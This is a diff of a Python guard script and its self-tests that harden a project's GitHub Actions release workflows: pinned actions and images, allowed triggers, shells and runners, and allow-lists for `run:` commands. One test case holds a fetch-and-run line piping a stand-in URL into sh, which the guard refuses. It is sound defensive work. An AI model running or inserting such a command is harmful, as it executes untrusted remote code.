+        if problem:  # one line per cause: the fetch-step reason names the command, so the allow-list line is not repeated
+            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` is a fetch step that runs {problem} "
+                    "(Round 6, 3-agent vote 6def5ab6: a step that downloads may run only "
+                    f"{', '.join(FETCH_ALLOWED)}, the fetch allow-list; split it into a fetch step and a use step)")
+        elif reason and not (DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw)):
+            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` runs {reason} (Round 8, S8, 3-agent vote 6def5ab6: the "
+                    f"run allow-list RUN_ALLOWED names every command word a `run:` may use, {', '.join(RUN_ALLOWED[:6])}, ...)")
+        if not problem and not reason:
+            env_bad = env_write_problem(scan)
+            if env_bad:
+                rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` sets {env_bad} (Round 9, sec r8 F1, F2: a variable that "
+                        "picks a program, a linker, a config or a registry loads it in every later command and step, so it is "
+                        "refused in every `run:`, not only in a fetch step)")
+            elif scan.f3_error is not None:  # Round 12: last, so an older rule's message is never doubled
+                rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` is refused: {scan.f3_error}")
+        for key in matrix_complex_keys(raw, ctx):
+            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` splices `matrix.{key}`, a mapping or sequence value, whole "
+                    "into the script (Round 9, F8: only a scalar matrix value is a word the guard can read)")
+        for label, variant in matrix_variants(raw, ctx):
+            try:
+                vscan = ShellScan(variant)
+                why = run_problem(vscan, ctx) or fetch_problem(vscan, {}, ctx.made) or (
+                    f"text the scanner cannot read ({vscan.f3_error})" if vscan.f3_error is not None else "")
+            except ShellError as err:
+                why = f"text the scanner cannot read ({err})"
+            if why:
+                rep.bad(f"{name}: {where}: line {run.line + 1}: matrix value `{label}` spliced into `run:` runs {why} "
+                        "(Round 8, S4: a literal matrix value is scanned as run text)")
+    cross_step(step, facts, ctx, name, where, rep, run.line + 1)
+
+
+def defaults_shell(node: Node, name: str, what: str, rep: Report) -> str:
+    """Round 7 (N4): the `defaults.run.shell` of the workflow or a job: "" when unset, else it must be bash or sh."""
+    defaults = node.get("defaults")
+    run = defaults.get("run") if defaults is not None else None
+    for held in (defaults, run):  # Round 8 (S5): a scalar `defaults` or `defaults.run` hides the shell, so it is a problem
+        if held is not None and held.kind != "map":
+            rep.bad(f"{name}: {what}: line {held.line + 1}: `defaults.run.shell: {held.kind}` is not allowed (Round 8, S5: "
+                    f"`defaults` and `defaults.run` must be mappings so the shell they name can be read; {' or '.join(SHELL_ALLOWED)} only)")
+            return ""
+    shell = run.get("shell") if run is not None else None
+    if shell is None:
+        return ""
+    got = shell.text().strip() if shell.kind == "scalar" else ""
+    if got not in SHELL_ALLOWED:
+        rep.bad(f"{name}: {what}: line {shell.line + 1}: `defaults.run.shell: {(got or shell.kind)[:30]}` is not allowed "
+                f"(Round 7: {' or '.join(SHELL_ALLOWED)} only)")
+    return got
+
+
+def job_windows(job: Node) -> bool:
+    """True when a job runs (or may run, for a matrix) on a Windows label."""
+    ro = job.get("runs-on")
+    text = ro.text().strip().lower() if ro is not None and ro.kind == "scalar" else ""
+    if RUNS_ON_MATRIX_RE.fullmatch(text):
+        return any(v.lower().startswith("windows") for v in matrix_os_values(job))
+    return text.startswith("windows")
+
+
+def check_matrix_exprs(job: Node, name: str, jname: str, rep: Report) -> None:
+    """Round 7 (F2): no matrix value of a job other than release.yml's `release` job (pinned by check_matrix) is an
+    expression, so no event value can widen what the job's own `run:` text may name."""
+    st = job.get("strategy")
+    matrix = st.get("matrix") if st is not None else None
+    if matrix is not None and any("${{" in t for t in node_texts(matrix)):
+        rep.bad(f"{name}: job `{jname}`: line {matrix.line + 1}: a `strategy.matrix` value is an expression (Round 7, F2: "
+                "a matrix value of this job must be a literal; only release.yml's `release` job is pinned by check_matrix)")
+
+
+def check_runs_on(job: Node, name: str, jname: str, rep: Report) -> None:
+    """Round 6 (security 3, 4): a job runs on one hosted label, or on `${{ matrix.os }}` of a hosted-only matrix."""
+    ro = job.get("runs-on")
+    if ro is None:
+        return  # a reusable-workflow job has none; a missing one is actionlint's
+    text = ro.text().strip() if ro.kind == "scalar" and ro.style == "plain" else ""  # a flow list `[x]` is not a label
+    ok = text in HOSTED_RUNNERS
+    if not ok and RUNS_ON_MATRIX_RE.fullmatch(text):
+        values = matrix_os_values(job)
+        ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)
+    if not ok:
+        rep.bad(f"{name}: job `{jname}`: line {ro.line + 1}: `runs-on` must be a hosted label "
+                f"({', '.join(HOSTED_RUNNERS)}) or `${{{{ matrix.os }}}}` of a matrix whose `os` values are all hosted "
+                f"(got `{(text or ro.kind)[:40]}`)")
+
+
+def on_canon(node: Node) -> object:
+    """The `on:` block as plain data (descriptions dropped) for the ON_PINS comparison."""
+    if node.kind == "scalar":
+        return node.text()
+    if node.kind == "seq":
+        return [on_canon(n) for n in node.value]  # type: ignore[union-attr]
+    if node.kind == "map":
+        return {k: on_canon(v) for k, v in node.value.items() if k != "description"}  # type: ignore[union-attr]
+    return None
+
+
+def on_triggers(node: Node) -> List[str]:
+    if node.kind == "map":
+        return list(node.keys())
+    if node.kind == "seq":
+        return [n.text().strip() for n in node.value if n.kind == "scalar"]  # type: ignore[union-attr]
+    if node.kind == "scalar":
+        return [p for p in re.split(r"[\s,\[\]]+", node.text()) if p]
+    return []
+
+
+def check_on(doc: Node, name: str, rep: Report) -> None:
+    """Round 6 (security 5): no workflow_call, pull_request_target or repository_dispatch trigger, and the `on:`
+    block of release.yml, c8-precheck.yml and publish-ci-image.yml is pinned."""
+    on = doc.get("on")
+    if on is None:
+        return
+    bad = [t for t in on_triggers(on) if t in ON_FORBIDDEN]
+    if bad:
+        rep.bad(f"{name}: `on:` line {on.line + 1}: trigger `{bad[0]}` is not allowed (no guarded workflow may be "
+                f"called, or run with a write token on a fork's code, or be dispatched from outside: {', '.join(ON_FORBIDDEN)})")
+    pin = ON_PINS.get(name)
+    if pin is not None and json.dumps(on_canon(on), sort_keys=True, separators=(",", ":")) != pin:
+        rep.bad(pin_message(f"{name}: `on:` line {on.line + 1}", "the trigger block differs from its pin", "ON_PINS"))
+
+
+def check_images(job: Node, name: str, jname: str, rep: Report) -> None:
+    """Round 5 (F2): every container and service image of a job is pinned by digest."""
+    where = f"{name}: job `{jname}`"
+    container = job.get("container")
+    if container is not None:
+        image = container if container.kind == "scalar" else container.get("image") if container.kind == "map" else None
+        if image is None or image.kind != "scalar" or not IMAGE_DIGEST_RE.fullmatch(image.text().strip()):
+            rep.bad(f"{where}: line {container.line + 1}: `container` image must be pinned by digest "
+                    "(`name@sha256:<64 hex>`; a tag or a bare name can be re-pointed)")
+    services = job.get("services")
+    if services is None:
+        return
+    if services.kind != "map":
+        rep.bad(f"{where}: line {services.line + 1}: `services` must be a mapping of pinned images")
+        return
+    for sname, service in services.value.items():  # type: ignore[union-attr]
+        image = service.get("image") if service.kind == "map" else None
+        if image is None or image.kind != "scalar" or not IMAGE_DIGEST_RE.fullmatch(image.text().strip()):
+            rep.bad(f"{where}: line {service.line + 1}: `services.{sname}.image` must be pinned by digest "
+                    "(`name@sha256:<64 hex>`; a tag or a bare name can be re-pointed)")
+
+
+def check_jobs_shape(doc: Node, name: str, rep: Report) -> None:
+    """Round 5 (F3, F2, F4): the shape of `jobs`, each job, its `needs`, `steps` and steps, then images and run text."""
+    jobs = doc.get("jobs")
+    if jobs is None or jobs.kind != "map" or not jobs.keys():
+        rep.bad(f"{name}: `jobs:` must be a non-empty mapping (got {'nothing' if jobs is None else jobs.kind})")
+        return
+    wf_shell = defaults_shell(doc, name, "workflow", rep)
+    check_env_keys(doc.get("env"), name, "workflow", rep)
+    for jname, job in jobs.value.items():  # type: ignore[union-attr]
+        where = f"{name}: job `{jname}`"
+        if job.kind != "map":
+            rep.bad(f"{where}: line {job.line + 1}: a job must be a mapping (got {job.kind})")
+            continue
+        job_shell = defaults_shell(job, name, f"job `{jname}`", rep) or wf_shell
+        check_env_keys(job.get("env"), name, f"job `{jname}`", rep)
+        needs = job.get("needs")
+        if needs is not None and not (needs.kind == "scalar" or (
+                needs.kind == "seq" and all(n.kind == "scalar" for n in needs.value))):  # type: ignore[union-attr]
+            rep.bad(f"{where}: line {needs.line + 1}: `needs` must be a string or a list of strings")
+        check_images(job, name, jname, rep)
+        if not (name == "release.yml" and jname == "release"):  # pinned by check_release_job and check_matrix
+            check_runs_on(job, name, jname, rep)
+            check_matrix_exprs(job, name, jname, rep)
+        steps = job.get("steps")
+        if job.get("uses") is not None and steps is None:
+            continue  # a reusable-workflow job has no steps; its `uses` is pinned by check_ref
+        if steps is None or steps.kind != "seq" or not steps.value:
+            rep.bad(f"{where}: `steps` must be a non-empty list (got {'nothing' if steps is None else steps.kind})")
+            continue
+        ctx = run_context(steps, matrix_keys(job), (doc.get("env"), job.get("env")), job_shell, job_windows(job),
+                          matrix_literals(job))
+        for i, step in enumerate(steps.value):  # type: ignore[union-attr]
+            if step.kind != "map":
+                rep.bad(f"{where} step {i + 1}: line {step.line + 1}: a step must be a mapping (got {step.kind})")
+                continue
+            check_run(step, name, f"job `{jname}` step {i + 1}", rep, ctx)
+
+
+def check_uses_pinned(doc: Node, name: str, rep: Report) -> None:
+    """#6904: every `uses:` of every job and step is pinned (USES_PINNED_RE).
+
+    Called for release.yml, release-shape.yml, c8-precheck.yml and
+    publish-ci-image.yml (#8002, #8020): each refusal names the job and step.
+    Round 5 adds the workflow-shape, image, `run:` and local-action checks of one workflow."""
+    for path, node in walk(doc):
+        if not path or path[-1] != "uses":
+            continue
+        check_ref(node, name, uses_where(doc, path), rep, name == "release.yml" and path[:2] == ("jobs", "docker"), ())
+    check_on(doc, name, rep)
+    check_jobs_shape(doc, name, rep)
+
+
 def check_release_yml(text: str, rep: Report) -> None:
     check_no_bash_env("release.yml", text, rep)
     check_text_counts(text, rep)
@@ -1126,6 +3955,7 @@ def check_release_yml(text: str, rep: Report) -> None:
         return
     check_blocks(doc, "release.yml", rep)
     check_run_continuations(doc, "release.yml", rep)
+    check_uses_pinned(doc, "release.yml", rep)
     check_secrets_and_registry(doc, rep)
     for key in doc.keys():
         if key not in TOP_KEYS:
@@ -1274,6 +4104,7 @@ def check_shape(text: str, rep: Report, advisory: Optional[bool] = None) -> None
         return
     check_blocks(doc, "release-shape.yml", rep)
     check_run_continuations(doc, "release-shape.yml", rep)
+    check_uses_pinned(doc, "release-shape.yml", rep)
     if doc.keys() != list(SHAPE_TOP_KEYS):
         rep.bad(pin_message("release-shape.yml", f"top-level keys {doc.keys()} differ from the pinned "
                             f"{list(SHAPE_TOP_KEYS)} (a top-level `defaults:` or `env:` change redirects every step)",
@@ -1316,6 +4147,30 @@ def check_shape(text: str, rep: Report, advisory: Optional[bool] = None) -> None
                       rep, "SHAPE_PROOF", _shape_norm)
     if builds and proofs and proofs[0] < builds[0]:
         rep.bad("release-shape.yml: the pg proof must run after the release-shaped build, in the same job")
+    # #6290: the whole ordered step list is pinned (SHAPE_STEPS).
+    items = [st for _, st in steps]
+    raw = job.get("steps")
+    if raw is None or raw.kind != "seq" or not isinstance(raw.value, list) or len(items) != len(raw.value):
+        rep.bad(pin_message("release-shape.yml", "`jobs.release-shape.steps` is missing, not a sequence or holds a "
+                            "non-mapping step", "SHAPE_STEPS"))
+        return
+    if len(items) != len(SHAPE_STEPS):
+        rep.bad(pin_message("release-shape.yml", f"the release-shape job has {len(items)} steps, the pinned list has "
+                            f"{len(SHAPE_STEPS)} (an extra step can replace the proven binary or the proof script; a "
+                            "missing one skips a control)", "SHAPE_STEPS"))
+        return
+    units = {"build": builds, "proof": proofs}
+    for n, (step, spec) in enumerate(zip(items, SHAPE_STEPS)):
+        if isinstance(spec, Unit):
+            if units[str(spec)] != [n]:
+                rep.bad(pin_message("release-shape.yml", f"`jobs.release-shape.steps.{n + 1}` must be the {spec} unit "
+                                    f"({SHAPE_STEP_ROLES[n]}); the proof runs after the build, in the same job",
+                                    "SHAPE_STEPS"))
+            continue
+        why = pin_problem(step, spec, f"jobs.release-shape.steps.{n + 1} ({SHAPE_STEP_ROLES[n]})")
+        if why:
+            rep.bad(pin_message("release-shape.yml", why + " (#6290: no step may carry an unpinned `if:`, "
+                                "`continue-on-error:` or `timeout-minutes:`)", "SHAPE_STEPS"))
 
 
 def check_install(text: str, rep: Report) -> None:
@@ -1329,9 +4184,12 @@ def check_install(text: str, rep: Report) -> None:
 
 def run_guard(root: Path, advisory: Optional[bool] = None) -> Tuple[List[str], str]:
     rep = Report()
+    rep.root = root
     feat = load(root / "scripts" / "release-features.sh", "scripts/release-features.sh", rep, False)
     rel = load(root / ".github" / "workflows" / "release.yml", ".github/workflows/release.yml", rep, True)
     shape = load(root / ".github" / "workflows" / "release-shape.yml", ".github/workflows/release-shape.yml (no release-shaped proof)", rep, True)
+    c8 = load(root / ".github" / "workflows" / "c8-precheck.yml", ".github/workflows/c8-precheck.yml (#8002)", rep, True)
+    publish = load(root / ".github" / "workflows" / "publish-ci-image.yml", ".github/workflows/publish-ci-image.yml (#8020)", rep, True)
     docker = load(root / "Dockerfile", "Dockerfile", rep, True)
     install = load(root / "docs" / "INSTALL.md", "docs/INSTALL.md", rep, False)
 
@@ -1356,6 +4214,11 @@ def run_guard(root: Path, advisory: Optional[bool] = None) -> Tuple[List[str], s
         check_release_yml(rel, rep)
     if docker is not None:
         check_dockerfile(docker, rep)
+    for wf_name, wf_text in (("c8-precheck.yml", c8), ("publish-ci-image.yml", publish)):
+        if wf_text is not None:
+            wf_doc = parse_yaml(wf_text, wf_name, rep)
+            if wf_doc is not None:
+                check_uses_pinned(wf_doc, wf_name, rep)
     if shape is not None:
         check_shape(shape, rep, advisory)
     if install is not None:
@@ -1371,7 +4234,9 @@ SHAPE = ".github/workflows/release-shape.yml"
 DOCKER = "Dockerfile"
 INSTALL = "docs/INSTALL.md"
 DECL = "scripts/release-features.sh"
-INPUT_FILES = (REL, SHAPE, DOCKER, INSTALL, DECL)
+C8 = ".github/workflows/c8-precheck.yml"
+PUBLISH = ".github/workflows/publish-ci-image.yml"
+INPUT_FILES = (REL, SHAPE, C8, PUBLISH, DOCKER, INSTALL, DECL)
 
 
 def mutate_file(path: Path, old: str, new: Union[str, None, Transform], every: bool = False) -> None:
@@ -1384,6 +4249,7 @@ def mutate_file(path: Path, old: str, new: Union[str, None, Transform], every: b
         path.write_text(new(path.read_text(encoding="utf-8")), encoding="utf-8")
         return
     if old == "":
+        path.parent.mkdir(parents=True, exist_ok=True)
         path.write_bytes(new.encode("utf-8", "surrogateescape"))
         return
     text = path.read_text(encoding="utf-8")
@@ -1595,6 +4461,47 @@ def _docker_steps_scalar(text: str) -> str:
     a, c = text.index("\n  docker:\n"), text.index("\n  copr:\n")
     s = text.index("    steps:\n", a)
     return text[:s] + "    steps: none\n" + text[c:]
+
+
+def _job_edit(job: str, fn: Callable[[str], str]) -> Transform:
+    """A Transform that rewrites only the body of workflow job ``job`` (#8023 cells)."""
+    def go(text: str) -> str:
+        m = re.search(r"(?m)^  " + re.escape(job) + r":\n(?:(?!^  [A-Za-z0-9_-]+:\n).*\n?)*", text)
+        if m is None:
+            raise InputError(f"self-test: job {job} not found")
+        return text[:m.start()] + fn(m.group(0)) + text[m.end():]
+    return go
+
+
+_SHA_USES_RE = re.compile(r"(uses:\s*[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@)[0-9a-f]{40}")
+
+
+def _first_use_to_tag(text: str) -> str:
+    """Repoint the first pinned `uses:` of a workflow to the mutable tag v4 (#6904)."""
+    return _SHA_USES_RE.sub(r"\g<1>v4", text, count=1)
+
+
+def _first_checkout_to_other_sha(text: str) -> str:
+    """Repin the first actions/checkout to another valid 40-hex sha (#8030)."""
+    return re.sub(r"(uses:\s*actions/checkout@)[0-9a-f]{40}", r"\g<1>" + "0" * 40, text, count=1)
+
+
+def _checkout_spelled(spelling: str, sha: str = "0" * 40) -> Callable[[str], str]:
+    """Respell the first actions/checkout of a job text as ``spelling@sha`` (Round 5 F1)."""
+    def go(text: str) -> str:
+        return text.replace(CHECKOUT_USES, spelling + "@" + sha, 1)
+    return go
+
+
+def _shape_scalar_step(text: str) -> str:
+    return text.rstrip("\n") + "\n      - just-a-scalar\n"
+
+
+def _shape_swap_guard_build(text: str) -> str:
+    a = text.index("      - name: Release feature declaration guard\n")
+    b = text.index("      - name: Build release binary")
+    c = text.index("      - name: No OpenSSL")
+    return text[:a] + text[b:c] + text[a:b] + text[c:]
 
 
 def _shape(old: str, new: Union[str, Transform]) -> Edit:
@@ -1826,6 +4733,48 @@ CASES: Dict[str, Tuple[str, List[Edit]]] = {
     "L1 Dockerfile is missing": ("fail", [(DOCKER, "", None, False)]),
     "L1 release-shape.yml is missing": ("fail", [(SHAPE, "", None, False)]),
     "L1 docs/INSTALL.md is missing": ("fail", [(INSTALL, "", None, False)]),
+    "L1 c8-precheck.yml is missing": ("fail", [(C8, "", None, False)]),
+    "L1 publish-ci-image.yml is missing": ("fail", [(PUBLISH, "", None, False)]),
+    # Round-2 cells (#8023): one per refusal site the #6289 / #6290 / #6904 / #8002 / #8020 fixes add.
+    "N1 root job preflight gains needs is refused": ("fail", [
+        _rel("", _job_edit("preflight", lambda b: b.replace("  preflight:\n", "  preflight:\n    needs: qualify\n", 1)))]),
+    "N2 homebrew needs drops release is refused": ("fail", [
+        _rel("", _job_edit("homebrew", lambda b: b.replace("needs: [preflight, qualify, release]", "needs: [preflight, qualify]", 1)))]),
+    "N3 release.yml preflight uses repointed to a tag is refused": ("fail", [
+        _rel("", _job_edit("preflight", _first_use_to_tag))]),
+    "N11 release.yml crates-io uses repointed to a tag is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _first_use_to_tag))]),
+    "N4 release-shape.yml uses repointed to a tag is refused": ("fail", [(SHAPE, "", _first_use_to_tag, False)]),
+    "N5 c8-precheck.yml uses repointed to a tag is refused": ("fail", [(C8, "", _first_use_to_tag, False)]),
+    "N6 publish-ci-image.yml uses repointed to a tag is refused": ("fail", [(PUBLISH, "", _first_use_to_tag, False)]),
+    "N7 release-shape holds a non-mapping step is refused": ("fail", [(SHAPE, "", _shape_scalar_step, False)]),
+    "N8 release-shape step appended is refused": ("fail", [
+        (SHAPE, "", lambda x: x.rstrip("\n") + "\n\n      - name: x\n        run: echo\n", False)]),
+    "N10 release-shape guard step gains if: false is refused": ("fail", [
+        _shape("      - name: Release feature declaration guard\n",
+               "      - name: Release feature declaration guard\n        if: false\n")]),
+    # Round-3 cells (#8030): the per-action *_USES comparison, one cell per workflow.
+    "N12 release.yml preflight checkout repinned to another sha is refused": ("fail", [
+        _rel("", _job_edit("preflight", _first_checkout_to_other_sha))]),
+    "N13 release.yml crates-io checkout repinned to another sha is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _first_checkout_to_other_sha))]),
+    "N14 release-shape.yml checkout repinned to another sha is refused": ("fail", [
+        (SHAPE, "", _first_checkout_to_other_sha, False)]),
+    "N15 c8-precheck.yml checkout repinned to another sha is refused": ("fail", [
+        (C8, "", _first_checkout_to_other_sha, False)]),
+    "N16 publish-ci-image.yml checkout repinned to another sha is refused": ("fail", [
+        (PUBLISH, "", _first_checkout_to_other_sha, False)]),
+    "N17 c8-precheck.yml holds a value outside the subset grammar is refused": ("fail", [
+        (C8, "", lambda x: x.rstrip("\n") + '\n\nx-extra: "abc\n', False)]),
+    # Round-5 cells (F1): the per-action comparison is on the case-folded owner/repo with any subpath kept.
+    "N18 crates-io checkout spelled with another case and another sha is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _checkout_spelled("Actions/Checkout")))]),
+    "N19 crates-io checkout with a subpath and another sha is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _checkout_spelled("actions/checkout/sub")))]),
+    "N20 crates-io checkout with a dot segment is refused": ("fail", [
+        _rel("", _job_edit("crates-io", _checkout_spelled("actions/checkout/..", CHECKOUT_USES.partition("@")[2])))]),
+    "N21 crates-io checkout spelled with another case and the pinned sha passes": ("pass", [
+        _rel("", _job_edit("crates-io", _checkout_spelled("ACTIONS/Checkout", CHECKOUT_USES.partition("@")[2])))]),
     # --- control characters: Python and bash disagree on what a line is
     "control character: CR line ends in release.yml": ("fail", [_rel(REL_ASSERT, REL_ASSERT + "\r")]),
     "control character: form feed in the Dockerfile": ("fail", [(DOCKER, DOCKER_ASSERT, DOCKER_ASSERT + "\x0c# x", False)]),
@@ -2011,9 +4960,9 @@ CASES: Dict[str, Tuple[str, List[Edit]]] = {
     "SR8/I10 local composite action in the docker job": ("fail", _docker_extra_step("        uses: ./.github/actions/x\n")),
     "SR8 extra step after the attestation": ("fail", [_rel(BUILD_IMG_NAME, _docker_step_last)]),
     "SR8/I11 registry copy in the crates-io job": ("fail", [_rel(
-        CRATES_STEPS, CRATES_STEPS + "      - name: extra\n        run: crane copy x ghcr.io/o/ai-memory:latest\n")]),
+        CRATES_STEPS, CRATES_STEPS + "      - name: extra\n        run: echo x ghcr.io/o/ai-memory:latest\n")]),
     "SR8/I11b upper-case registry name in the crates-io job": ("fail", [_rel(
-        CRATES_STEPS, CRATES_STEPS + "      - name: extra\n        run: crane copy x GHCR.IO/o/ai-memory:latest\n")]),
+        CRATES_STEPS, CRATES_STEPS + "      - name: extra\n        run: echo x GHCR.IO/o/ai-memory:latest\n")]),
     "SR8 top-level packages write": ("fail", [_rel("\npermissions:\n  contents: read\n",
                                                   "\npermissions:\n  contents: read\n  packages: write\n")]),
     "8172 top-level contents write regained": ("fail", [_rel("\npermissions:\n  contents: read\n",
@@ -2090,10 +5039,58 @@ MESSAGE_CASES: Dict[str, Tuple[List[Edit], int, str]] = {
                                                         "update LOGIN_USES in scripts/check_release_features.py"),
     "message: IMAGE_BUILD_USES SHA bump": ([_rel(IMAGE_BUILD_USES, IMAGE_BUILD_USES[:-1] + "0")], 1,
                                            "update IMAGE_BUILD_USES in scripts/check_release_features.py"),
+    "message: the on: block of release.yml is pinned": ([(REL, "        default: true\n", "        default: false\n", False)], 1,
+                                                       "update ON_PINS in scripts/check_release_features.py"),
+    "message: a checkout repin names the constant": ([_rel("", _job_edit("crates-io", _first_checkout_to_other_sha))], 1,
+                                                     "differs from CHECKOUT_USES"),
+    # Round-3 cells (#8039): the SHAPE_STEPS and uses: pins now refuse the inputs that once reached ONLY the
+    # refusals below, so each is proven by an exact message count (a neutralised refusal drops the count).
+    "message: an inline use in the release-shape tree step is refused on its own": (
+        [(SHAPE, '--features "$FEATURES")"', '--features "$(bash scripts/release-features.sh)")"', False)], 2,
+        "inline use of the declaration"),
+    "message: a proof before the build is refused on its own": (
+        [(SHAPE, PROOF_NAME, _proof_before_build, False)], 5, "the pg proof must run after the release-shaped build"),
     "message: a tag added names DOCKER_STEPS": ([_rel(PUSH_TAGS, PUSH_TAGS + "            ghcr.io/o/ai-memory:x\n")], 1,
                                                 "update DOCKER_STEPS in scripts/check_release_features.py"),
+    "message: swapped guard and build steps name the unit slot": ([(SHAPE, "", _shape_swap_guard_build, False)], 2,
+                                                                  "keys differ from the pinned set"),
+    "message: a non-mapping step is refused three times (workflow shape, kind, then the pinned list)": (
+        [(SHAPE, "", _shape_scalar_step, False)], 3, "must be a mapping"),
+    "message: tag-pinned uses names the job and step": ([(PUBLISH, "", _first_use_to_tag, False)], 1,
+                                                        "job `publish-ci-image` step 1"),
     "message: build unit drift names WF_BUILD": ([_rel(REL_BUILD_CMD, REL_BUILD_CMD + " --verbose")], 2,
                                                  "update WF_BUILD in scripts/check_release_features.py"),
+}
+
+# Round 5 (#8003): the new job-shape checks refuse these inputs too, so the older, more specific refusals are
+# proven by their own message appearing anywhere in the refusal list (a neutralised refusal drops the needle).
+JOINED_CASES: Dict[str, Tuple[List[Edit], str]] = {
+    # Round 6: the expression allow-list now also refuses `matrix.target` outside the release job, so the text-count
+    # backstop is proven by its own message.
+    "joined: a second matrix-target build in another job is counted": (
+        [_rel(SBOM_HDR, "      - name: x\n        run: cargo build --target ${{ matrix.target }}\n" + SBOM_HDR)],
+        "lines run a build tool against the matrix target"),
+    "joined: a second matrix-target build spelled c''argo in another job is counted": (
+        [_rel(SBOM_HDR, "      - name: x\n        run: c''argo build --target ${{ matrix.target }}\n" + SBOM_HDR)],
+        "lines run a build tool against the matrix target"),
+    "joined: a second SBOM spelled c''argo is counted": (
+        [_rel(SBOM_HDR, "      - name: x\n        run: c''argo cyclonedx --format json\n" + SBOM_HDR)],
+        "lines run `cargo ... cyclonedx`"),
+    "joined: a c\"\"argo build in a later release step names the canonical build step": (
+        _step_before_pkg('        run: c""argo build --release\n'),
+        "only the canonical build step may run a build tool in the release job"),
+    "joined: a quoted second build is counted against the matrix target": (
+        [_rel(REL_BUILD_CMD, REL_BUILD_CMD + "\n" + IND + '"cargo" build --release --target ${{ matrix.target }} --features sal')],
+        "lines run a build tool against the matrix target"),
+    "joined: a docker job that is not a mapping names the GHCR push": (
+        [_rel("", _job_edit("docker", lambda body: "  docker: nope\n"))],
+        "the `docker:` job is missing or not a mapping"),
+    "joined: docker steps that are not a sequence name DOCKER_STEPS": (
+        [_rel("", _job_edit("docker", lambda body: re.sub(r"(?s)    steps:\n.*\Z", "    steps: nope\n", body)))],
+        "`jobs.docker.steps` must be a sequence"),
+    "joined: a pinned job calling a reusable workflow is named": (
+        [_rel(COPR_HDR, COPR_HDR + "    uses: ./.github/workflows/x.yml\n")],
+        "calls a reusable workflow"),
 }
 
 
@@ -2134,6 +5131,8 @@ ENTRY_CASES: Dict[str, Tuple[Callable[[Path], None], int]] = {
     "entry: release-shape.yml is a directory exits 2": (_entry_dir(SHAPE), 2),
     "entry: INSTALL.md is a directory exits 2": (_entry_dir(INSTALL), 2),
     "entry: release-features.sh is a directory exits 2": (_entry_dir(DECL), 2),
+    "entry: c8-precheck.yml is a directory exits 2": (_entry_dir(C8), 2),
+    "entry: publish-ci-image.yml is a directory exits 2": (_entry_dir(PUBLISH), 2),
     "entry: dangling release.yml symlink is a guard failure (1)": (_entry_dangling(REL), 1),
 }
 
@@ -2170,6 +5169,336 @@ SCALARS: Tuple[Tuple[str, str, Optional[str]], ...] = (
 )
 
 
+# Round-5 cells: the workflow-shape, image, `run:` and local-action checks run on small documents (and, for local
+# actions, a small tree) so each refusal is proven by an exact message count. name -> (document, files, count,
+# needle): ``files`` None = no checked-out tree; a dict = relative path -> text written under the tree root.
+R5_DIGEST = "sha256:" + "ab" * 32
+R5_LOCAL = "      - uses: ./act\n"
+R5_OK_RUN = "      - run: echo ok\n"
+
+
+def _r5_job(head: str = "", steps: str = "    steps:\n" + R5_OK_RUN) -> str:
+    return "jobs:\n  a:\n" + head + steps
+
+
+def _r5_comp(steps: str) -> str:
+    return "name: p\nruns:\n  using: composite\n  steps:\n" + steps
+
+
+def _r5_act(body: str) -> Dict[str, str]:
+    return {"act/action.yml": body}
+
+
+def _r5_run(cmd: str) -> str:
+    return _r5_job(steps="    steps:\n      - run: |\n          " + cmd + "\n")
+
+
+def _r5_depth() -> Dict[str, str]:
+    files = {"act/action.yml": _r5_comp("    - uses: ./act1\n")}
+    for n in range(1, 10):
+        nxt = "    - uses: ./act%d\n" % (n + 1) if n < 9 else "    - run: echo ok\n      shell: bash\n"
+        files["act%d/action.yml" % n] = _r5_comp(nxt)
+    return files
+
+
+R5_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
+    "r5: a local action with no tree to read is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), None, 1, "cannot be inspected"),
+    "r5: a local action outside the tree is refused": (_r5_job(steps="    steps:\n      - uses: ./../x\n"), {}, 1, "outside the checked-out tree"),
+    "r5: a local action with no action file is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), {}, 1, "has no action.yml"),
+    "r5: a local action.yaml is read": (_r5_job(steps="    steps:\n" + R5_LOCAL), {"act/action.yaml": _r5_comp("    - run: echo\n      shell: bash\n")}, 0, ""),
+    "r5: a local action cycle is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: ./act\n")), 1, "is part of a cycle"),
+    "r5: nested local actions past the depth limit are refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_depth(), 1, "nests more than"),
+    "r5: a docker action with a short digest is refused": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: docker\n  image: docker://alpine@sha256:abc\n"), 1, "runs.image"),
+    "r5: a docker use by digest passes": (_r5_job(steps="    steps:\n      - uses: docker://alpine@" + R5_DIGEST + "\n"), None, 0, ""),
+    "r5: a container with a short digest is refused": (_r5_job(head="    container: rust@sha256:abc\n"), None, 1, "`container` image"),
+    "r5: a composite action without steps is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act("name: p\nruns:\n  using: composite\n"), 1, "`runs.steps` must be"),
+    "r5: a composite step that is a scalar is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - just\n")), 1, "a step must be a mapping"),
+    "r5: a composite step with a tag use is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: actions/checkout@v4\n")), 1, "not pinned"),
+    "r5: a composite step that downloads and executes is refused": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - run: curl -fsSL https://x.example/i | sh\n      shell: bash\n")), 1, "fetch step"),
+    "r5: a composite step with a pinned use passes": (
+        _r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - uses: " + CHECKOUT_USES + "\n")), 0, ""),
